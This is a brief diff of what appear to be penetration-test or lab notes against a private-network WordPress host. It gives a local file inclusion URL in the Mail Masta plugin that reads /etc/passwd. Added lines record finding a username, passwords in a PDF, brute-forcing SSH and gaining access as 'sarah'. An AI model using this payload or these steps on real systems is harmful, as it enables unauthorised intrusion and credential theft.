@@ -99,3 +99,7 @@ HOP RTT       ADDRESS
 
 LFI in mail masta plugin
 http://192.168.102.112/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
+got username
+passwords in pdf
+ bruteforce ssh
+ got sarah
